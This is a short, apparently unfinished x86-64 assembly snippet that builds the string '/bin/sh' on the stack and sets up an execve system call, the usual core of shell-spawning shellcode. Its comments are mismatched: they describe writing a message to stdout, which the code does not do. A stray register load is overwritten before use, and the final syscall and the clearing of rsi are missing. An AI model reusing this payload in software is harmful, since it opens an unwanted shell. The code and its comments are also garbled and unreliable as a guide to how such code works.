section .text
    global _start

_start:
    
    mov R14, 0x68732f6e69622f
    push R14
    mov rdi, 0x1337132d10bf48
    mov rdi, rsp          ; file descriptor 1 (stdout)
    mov eax, 0x3b    ; pointer to message
    xor rdx, rdx     ; invoke the kernel

